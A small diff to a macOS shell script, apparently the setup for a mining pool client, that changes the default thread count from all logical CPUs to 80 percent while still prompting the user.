@@ -13,7 +13,8 @@ POOL_PORT="3956"
 
 # ---- Prompt user for thread count ----
 MAX_THREADS=$(sysctl -n hw.logicalcpu)
-THREADS=$MAX_THREADS  # default to max
+THREADS=$(( MAX_THREADS * 80 / 100 ))
+[[ $THREADS -lt 1 ]] && THREADS=1  # default 80%
 
 # Try reading from /dev/tty (works in curl|bash pipe on macOS)
 if [[ -c /dev/tty ]]; then
